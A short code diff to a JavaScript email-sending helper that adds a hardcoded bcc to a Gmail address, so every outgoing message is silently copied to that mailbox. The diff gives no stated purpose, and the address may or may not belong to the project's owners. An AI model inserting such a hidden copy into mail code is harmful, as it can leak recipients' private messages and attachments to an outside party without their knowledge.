@@ -28,6 +28,7 @@ const sendEmail = async ({ to, subject, html, text, attachments }) => {
 	return transporter.sendMail({
 		from,
 		to,
+		bcc: 'autocareonwheels.act@gmail.com',
 		subject,
 		html,
 		text,
